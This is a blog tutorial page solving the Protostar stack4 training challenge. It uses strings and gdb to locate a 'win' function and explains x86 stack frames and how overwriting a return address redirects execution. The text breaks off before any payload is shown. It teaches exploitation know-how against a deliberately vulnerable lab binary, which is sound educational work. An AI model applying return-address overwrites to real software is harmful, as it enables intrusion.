<!doctype html><html lang=en><head><title>Practical Reverse Engineering Tutorials Part 2: Protostar Stack4 :: Shantanu Vs The World</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="About the challenge In this article, we&rsquo;ll go through the Protostar stack4 challenge. This would be a bit similar to the stack0 challenge that we already tackled earlier, but it will think about an interesting way to get alternate code to execute instead of just modifying data.
Pre-requisite: Make sure you&rsquo;ve completed the Part 1 of the Practical Reverse Engineering Tutorials series. It&rsquo;d also be great if you can try stack1-stack3 challenges on your own as they are similar to stack0.
"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/><script async src="https://www.googletagmanager.com/gtag/js?id=G-5CKCTSFXW8"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5CKCTSFXW8")}</script><link rel=stylesheet href=https://shantanugoel.com/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css><link rel=stylesheet href=https://shantanugoel.com/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css><link rel=stylesheet href=https://shantanugoel.com/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css><link rel=stylesheet href=https://shantanugoel.com/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css><link rel=stylesheet href=https://shantanugoel.com/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://shantanugoel.com/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css><link rel=stylesheet href=https://shantanugoel.com/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css><link rel=stylesheet href=https://shantanugoel.com/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css><link rel=stylesheet href=https://shantanugoel.com/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css><link rel=stylesheet href=https://shantanugoel.com/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css><link rel=stylesheet href=https://shantanugoel.com/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css><link rel=stylesheet href=https://shantanugoel.com/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css><link rel=stylesheet href=https://shantanugoel.com/css/terminal.min.dd0bf9c7cacb24c1b0184f52f1869b274e06689557468cc7030ccf632328eb97.css><link rel=stylesheet href=https://shantanugoel.com/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel="shortcut icon" href=https://shantanugoel.com/favicon.png><link rel=apple-touch-icon href=https://shantanugoel.com/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Practical Reverse Engineering Tutorials Part 2: Protostar Stack4"><meta property="og:description" content="About the challenge In this article, we&rsquo;ll go through the Protostar stack4 challenge. This would be a bit similar to the stack0 challenge that we already tackled earlier, but it will think about an interesting way to get alternate code to execute instead of just modifying data.
Pre-requisite: Make sure you&rsquo;ve completed the Part 1 of the Practical Reverse Engineering Tutorials series. It&rsquo;d also be great if you can try stack1-stack3 challenges on your own as they are similar to stack0.
"><meta property="og:url" content="https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/"><meta property="og:site_name" content="Shantanu Vs The World"><meta property="og:image" content="https://shantanugoel.com/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2017-12-04 21:04:24 +0530 +0530"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Shantanu vs The World</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;‚ñæ</li><li><ul class=menu__dropdown><li><a href=https://github.com/shantanugoel/>üíª</a></li><li><a href=https://x.com/shantanugoel/>üê§</a></li><li><a href=/>/blog</a></li><li><a href=/notes>/notes</a></li><li><a href=/about>/about</a></li><li><a href=/archives>/archives</a></li><li><a href=/fun>/fun</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=https://github.com/shantanugoel/>üíª</a></li><li><a href=https://x.com/shantanugoel/>üê§</a></li><li><a href=/>/blog</a></li><li><a href=/notes>/notes</a></li><li><a href=/about>/about</a></li><li><a href=/archives>/archives</a></li><li><a href=/fun>/fun</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/>Practical Reverse Engineering Tutorials Part 2: Protostar Stack4</a></h1><div class=post-meta><time class=post-date>2017-12-04</time><span class=post-author>Shantanu Goel</span></div><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><a href=#about-the-challenge>About the challenge</a></li><li><a href=#recon>Recon</a></li><li><a href=#static-analysis>Static Analysis</a><ul><li><a href=#a-primer-about-x86-stack-frames>A primer about X86 stack frames</a></li></ul></li><li><a href=#dynamic-analysis>Dynamic Analysis</a></li><li><a href=#references--lessons-learnt>References / Lessons Learnt</a></li></ul></nav></div><div class=post-content><div><h2 id=about-the-challenge>About the challenge<a href=#about-the-challenge class=hanchor arialabel=Anchor>#</a></h2><p>In this article, we&rsquo;ll go through the <a href=https://exploit-exercises.com/protostar/stack4/>Protostar stack4</a> challenge. This would be a bit similar to the stack0 challenge that we already tackled earlier, but it will think about an interesting way to get alternate code to execute instead of just modifying data.</p><p><strong>Pre-requisite:</strong> Make sure you&rsquo;ve completed the <a href=/2017/11/16/practical-reverse-engineering-tutorial-1/>Part 1</a> of the Practical Reverse Engineering Tutorials series. It&rsquo;d also be great if you can try stack1-stack3 challenges on your own as they are similar to stack0.</p><h2 id=recon>Recon<a href=#recon class=hanchor arialabel=Anchor>#</a></h2><p>Assuming you&rsquo;ve done the setup as needed for Part 1 of this series, we straight away jump to run the challenge to see what we are after.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ ./stack4
</span></span><span style=display:flex><span>ABCD
</span></span><span style=display:flex><span>user@protostar:/opt/protostar/bin$
</span></span></code></pre></div><p>So, we see that the program asks for some user input. When we input &lsquo;ABCD&rsquo;, nothing happens. That&rsquo;s a bummer. We need to move to the static analysis to map out our next actions. Remember, it might be easier to look at the source code of the challenge (and it will also not give much away) but we&rsquo;ll still try to avoid source code as much as possible to give more exercise to our brains.</p><h2 id=static-analysis>Static Analysis<a href=#static-analysis class=hanchor arialabel=Anchor>#</a></h2><p>We first run our staple <code>strings</code> on the program to list interesting text data.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ strings stack4
</span></span><span style=display:flex><span>/lib/ld-linux.so.2
</span></span><span style=display:flex><span>__gmon_start__
</span></span><span style=display:flex><span>libc.so.6
</span></span><span style=display:flex><span>_IO_stdin_used
</span></span><span style=display:flex><span>gets
</span></span><span style=display:flex><span>puts
</span></span><span style=display:flex><span>__libc_start_main
</span></span><span style=display:flex><span>GLIBC_2.0
</span></span><span style=display:flex><span>PTRh 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>^_<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>code flow successfully changed
</span></span><span style=display:flex><span>user@protostar:/opt/protostar/bin$ 
</span></span></code></pre></div><p>We see a potentially useful string <code>code flow successfully changed</code> straight away. I&rsquo;d wager a guess that we&rsquo;ve to get our currently dumb program to emit this string somehow. Let&rsquo;s see what is the condition under which this string is being printed. So we bring out gdb like last time and check the disassembled code of main function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ gdb stack4 
</span></span><span style=display:flex><span>GNU gdb <span style=color:#f92672>(</span>GDB<span style=color:#f92672>)</span> 7.0.1-debian
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Free Software Foundation, Inc.
</span></span><span style=display:flex><span>License GPLv3+: GNU GPL version <span style=color:#ae81ff>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span></span><span style=display:flex><span>This is free software: you are free to change and redistribute it.
</span></span><span style=display:flex><span>There is NO WARRANTY, to the extent permitted by law.  Type <span style=color:#e6db74>&#34;show copying&#34;</span>
</span></span><span style=display:flex><span>and <span style=color:#e6db74>&#34;show warranty&#34;</span> <span style=color:#66d9ef>for</span> details.
</span></span><span style=display:flex><span>This GDB was configured as <span style=color:#e6db74>&#34;i486-linux-gnu&#34;</span>.
</span></span><span style=display:flex><span>For bug reporting instructions, please see:
</span></span><span style=display:flex><span>&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
</span></span><span style=display:flex><span>Reading symbols from /opt/protostar/bin/stack4...done.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> set disassembly-flavor intel
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble main
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
</span></span><span style=display:flex><span>0x08048408 &lt;main+0&gt;:	push   ebp
</span></span><span style=display:flex><span>0x08048409 &lt;main+1&gt;:	mov    ebp,esp
</span></span><span style=display:flex><span>0x0804840b &lt;main+3&gt;:	and    esp,0xfffffff0
</span></span><span style=display:flex><span>0x0804840e &lt;main+6&gt;:	sub    esp,0x50
</span></span><span style=display:flex><span>0x08048411 &lt;main+9&gt;:	lea    eax,<span style=color:#f92672>[</span>esp+0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>0x08048415 &lt;main+13&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
</span></span><span style=display:flex><span>0x08048418 &lt;main+16&gt;:	call   0x804830c &lt;gets@plt&gt;
</span></span><span style=display:flex><span>0x0804841d &lt;main+21&gt;:	leave  
</span></span><span style=display:flex><span>0x0804841e &lt;main+22&gt;:	ret    
</span></span><span style=display:flex><span>End of assembler dump.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
</span></span></code></pre></div><p>That&rsquo;s interesting. So there&rsquo;s no way main can print the string we&rsquo;re after because there&rsquo;s no print/puts call in here. Interestingly, main makes only one function call to <code>gets</code> to get user input and there&rsquo;s no other function being called at all. This would mean that the string is being printed from somewhere else and our challenge is to get that code executed. We know from the previous challenge we solved that to print this string, the program would need to pass a pointer to it as a parameter to a output function (like <code>puts</code>). So to find that where this string is getting printed from, we&rsquo;ve to first the address where this string is located and then search for reference to it.</p><p>You may know that there are various sections in an executable file. Generally, the executable portion is part of a section called <code>.text</code> and literal strings are part of a section called <code>.rodata</code>. So, our technique here would be to:</p><ul><li>Get the section addresses (Using <code>maintenance info sections</code> gdb command)</li><li>Search for the string&rsquo;s address in .rodata section (using <code>find &lt;section_start_address> &lt;section_end_address> &lt;string></code> gdb command)</li><li>Search for a reference to the string&rsquo;s address in .text section (using <code>find &lt;section_start_address> &lt;section_end_address> &lt;string_address></code> gdb command)</li></ul><p>This is shown below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> maintenance info sections
</span></span><span style=display:flex><span>Exec file:
</span></span><span style=display:flex><span>    <span style=color:#e6db74>`</span>/opt/protostar/bin/stack4<span style=color:#960050;background-color:#1e0010>&#39;</span>, file type elf32-i386.
</span></span><span style=display:flex><span>    0x8048114-&gt;0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048128-&gt;0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048148-&gt;0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x804816c-&gt;0x8048198 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048198-&gt;0x80481b8 at 0x00000198: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x80481b8-&gt;0x8048218 at 0x000001b8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048218-&gt;0x8048267 at 0x00000218: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048268-&gt;0x8048274 at 0x00000268: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048274-&gt;0x8048294 at 0x00000274: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048294-&gt;0x804829c at 0x00000294: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x804829c-&gt;0x80482bc at 0x0000029c: .rel.plt ALLOC LOAD READONLY DATA HAS_CO---Type &lt;<span style=color:#66d9ef>return</span>&gt; to <span style=color:#66d9ef>continue</span>, or q &lt;<span style=color:#66d9ef>return</span>&gt; to quit---
</span></span><span style=display:flex><span>NTENTS
</span></span><span style=display:flex><span>    0x80482bc-&gt;0x80482ec at 0x000002bc: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
</span></span><span style=display:flex><span>    0x80482ec-&gt;0x804833c at 0x000002ec: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048340-&gt;0x80484bc at 0x00000340: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
</span></span><span style=display:flex><span>    0x80484bc-&gt;0x80484d8 at 0x000004bc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
</span></span><span style=display:flex><span>    0x80484d8-&gt;0x80484ff at 0x000004d8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8048500-&gt;0x8048504 at 0x00000500: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8049504-&gt;0x804950c at 0x00000504: .ctors ALLOC LOAD DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x804950c-&gt;0x8049514 at 0x0000050c: .dtors ALLOC LOAD DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8049514-&gt;0x8049518 at 0x00000514: .jcr ALLOC LOAD DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8049518-&gt;0x80495e8 at 0x00000518: .dynamic ALLOC LOAD DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x80495e8-&gt;0x80495ec at 0x000005e8: .got ALLOC LOAD DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x80495ec-&gt;0x8049608 at 0x000005ec: .got.plt ALLOC LOAD DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8049608-&gt;0x8049610 at 0x00000608: .data ALLOC LOAD DATA HAS_CONTENTS
</span></span><span style=display:flex><span>    0x8049610-&gt;0x8049618 at 0x00000610: .bss ALLOC
</span></span><span style=display:flex><span>    0x0000-&gt;0x0ad4 at 0x00000610: .stab READONLY HAS_CONTENTS
</span></span><span style=display:flex><span>    0x0000-&gt;0x3bd2 at 0x000010e4: .stabstr READONLY HAS_CONTENTS
</span></span><span style=display:flex><span>---Type &lt;<span style=color:#66d9ef>return</span>&gt; to <span style=color:#66d9ef>continue</span>, or q &lt;<span style=color:#66d9ef>return</span>&gt; to quit---
</span></span><span style=display:flex><span>    0x0000-&gt;0x0039 at 0x00004cb6: .comment READONLY HAS_CONTENTS
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> find 0x80484d8,0x80484ff,<span style=color:#e6db74>&#34;code flow successfully changed&#34;</span>
</span></span><span style=display:flex><span>0x80484e0
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> pattern found.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/s 0x80484e0
</span></span><span style=display:flex><span>0x80484e0:	 <span style=color:#e6db74>&#34;code flow successfully changed&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> find 0x8048340, 0x80484bc, 0x80484e0
</span></span><span style=display:flex><span>0x80483fd &lt;win+9&gt;
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> pattern found.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/3i 0x80483fd
</span></span><span style=display:flex><span>0x80483fd &lt;win+9&gt;:	loopne 0x8048383 &lt;__do_global_dtors_aux+19&gt;
</span></span><span style=display:flex><span>0x80483ff &lt;win+11&gt;:	add    al,0x8
</span></span><span style=display:flex><span>0x8048401 &lt;win+13&gt;:	call   0x804832c &lt;puts@plt&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Thus we figure that the string is being called as part of a function called <code>win</code> as gdb shows. We can confirm this by disassembling <code>win</code> and this will also give us its address that we need to direct our code execution to.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble win
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> win:
</span></span><span style=display:flex><span>0x080483f4 &lt;win+0&gt;:	push   ebp
</span></span><span style=display:flex><span>0x080483f5 &lt;win+1&gt;:	mov    ebp,esp
</span></span><span style=display:flex><span>0x080483f7 &lt;win+3&gt;:	sub    esp,0x18
</span></span><span style=display:flex><span>0x080483fa &lt;win+6&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x80484e0
</span></span><span style=display:flex><span>0x08048401 &lt;win+13&gt;:	call   0x804832c &lt;puts@plt&gt;
</span></span><span style=display:flex><span>0x08048406 &lt;win+18&gt;:	leave  
</span></span><span style=display:flex><span>0x08048407 &lt;win+19&gt;:	ret    
</span></span><span style=display:flex><span>End of assembler dump.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
</span></span></code></pre></div><p>So, we need to make our program start executing at 0x80483f4 (Entry point of function <code>win</code>) somehow.</p><h3 id=a-primer-about-x86-stack-frames>A primer about X86 stack frames<a href=#a-primer-about-x86-stack-frames class=hanchor arialabel=Anchor>#</a></h3><p>Before continuing further, we will have to learn a bit about how program control works through stack frames. A stack frame is a region on the stack particular to a single function being executed in the call flow and represents its execution environment. If the same function is called many times, each instance of calling that function will have its own stack frame on the stack. A stack frame typically consists of:</p><ul><li>Parameters passed to the function</li><li>Return address (Code location to jump to after the function is complete)</li><li>Pointer to the previous (Calling function&rsquo;s) stack frame&rsquo;s base</li><li>Local variables</li></ul><p>Let&rsquo;s see with the help of a small example how this works.</p><h4 id=sample-code>Sample Code<a href=#sample-code class=hanchor arialabel=Anchor>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>int</span> a)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> x <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> y <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;
</span></span><span style=display:flex><span>  x <span style=color:#f92672>=</span> a <span style=color:#f92672>+</span> x;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> x;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> a <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> b <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>foo</span>(a);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This will compile to the following assembly code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>foo:
</span></span><span style=display:flex><span><span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>ebp</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>ebp</span>,<span style=color:#66d9ef>esp</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span>    <span style=color:#66d9ef>esp</span>,<span style=color:#ae81ff>0x10</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x8</span>],<span style=color:#ae81ff>0x2</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x4</span>],<span style=color:#ae81ff>0x3</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>eax</span>,<span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x8</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x8</span>],<span style=color:#66d9ef>eax</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>eax</span>,<span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x8</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>leave</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>main:
</span></span><span style=display:flex><span><span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>ebp</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>ebp</span>,<span style=color:#66d9ef>esp</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span>    <span style=color:#66d9ef>esp</span>,<span style=color:#ae81ff>0x14</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x8</span>],<span style=color:#ae81ff>0x0</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x4</span>],<span style=color:#ae81ff>0x1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>eax</span>,<span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x8</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>esp</span>],<span style=color:#66d9ef>eax</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>call</span>   <span style=color:#ae81ff>0x80483ed</span> &lt;<span style=color:#66d9ef>foo</span>&gt;
</span></span><span style=display:flex><span><span style=color:#a6e22e>leave</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ret</span>
</span></span></code></pre></div><h4 id=stack-frame>Stack frame<a href=#stack-frame class=hanchor arialabel=Anchor>#</a></h4><p><img src=/img/2017/12/stack-frame.png alt="Stack Frame of function foo"></p><h4 id=important-registers>Important registers<a href=#important-registers class=hanchor arialabel=Anchor>#</a></h4><p>The x86 registers that one would be most interested in while understanding stack frames are:</p><ul><li>esp: Stack Pointer. Points to (Holds address of) the current top of the stack</li><li>ebp: Base Pointer. Points to (Holds address of) the base of the current stack frame</li><li>eip: Instruction Pointer. Points to (Holds address of) the next instruction to be executed in the program</li></ul><h4 id=calling-convention--function-parameters>Calling Convention / Function Parameters<a href=#calling-convention--function-parameters class=hanchor arialabel=Anchor>#</a></h4><p>In the x86 calling convention, the parameters being passed to a function and the return address are pushed onto the stack before calling it. This can be seen in the below instruction.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>esp</span>],<span style=color:#66d9ef>eax</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>call</span>   <span style=color:#ae81ff>0x80483ed</span> &lt;<span style=color:#66d9ef>foo</span>&gt;
</span></span></code></pre></div><p>Here, the <code>mov</code> instruction is pushing the parameter &lsquo;5&rsquo; onto the stack.</p><p>The <code>call</code> instruction is equivalent of pushing <code>eip + 2</code> onto the stack and then jumping to the called function&rsquo;s address. <code>eip + 2</code> here points to the address of the instruction that should be executed next after returning from the called function.</p><h4 id=function-prologue--entry-sequence>Function Prologue / Entry Sequence<a href=#function-prologue--entry-sequence class=hanchor arialabel=Anchor>#</a></h4><p>At the very beginning of a function, the first work done is to save the calling function&rsquo;s base pointer (ebp) onto the stack and then move the current function&rsquo;s base pointer to point towards calling function&rsquo;s top. This can be seen in these instructions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>foo:
</span></span><span style=display:flex><span><span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>ebp</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>ebp</span>,<span style=color:#66d9ef>esp</span>
</span></span></code></pre></div><h4 id=local-variables>Local Variables<a href=#local-variables class=hanchor arialabel=Anchor>#</a></h4><p>Then, space is created on the stack for holding any local variables.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>sub</span>    <span style=color:#66d9ef>esp</span>,<span style=color:#ae81ff>0x10</span>
</span></span></code></pre></div><h4 id=exit-sequence>Exit Sequence<a href=#exit-sequence class=hanchor arialabel=Anchor>#</a></h4><p>Finally, after the function has executed, it returns by restoring the calling function&rsquo;s base pointer and then popping the next value (return address) from stack into the eip.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>leave</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ret</span>
</span></span></code></pre></div><p>Here, <code>leave</code> is equivalent of <code>pop ebp</code> to restore ebp value. <code>ret</code> is equivalent of <code>pop eip</code> to start executing the next instruction after the function call.</p><h4 id=what-we-need-to-do>What we need to do<a href=#what-we-need-to-do class=hanchor arialabel=Anchor>#</a></h4><p>From the above analysis of the stack frame, we now know that:</p><ul><li>Program flow is controlled through eip register</li><li>On returning from a called function, eip register is updated with a value (return address) from the stack</li><li>If we can somehow overflow a local variable on stack to modify the return address accurately, we can control the program execution.</li><li>Note that similar to the function <code>foo</code>, even the function <code>main</code> has its own stack frame and returns back to &ldquo;something&rdquo; after completing its execution. This &ldquo;something&rdquo; is the c library runtime against which the compiler linked the program. So we can even try to change execution path by modifying this return address.</li></ul><h4 id=gotchas>Gotchas<a href=#gotchas class=hanchor arialabel=Anchor>#</a></h4><p>In some explanations, you may see espmain/StackFramemain in the figure above should also include the parameter being passed to foo. However, I&rsquo;ve excluded it here for the sake of avoiding confusion of overlapping stack frames.</p><h2 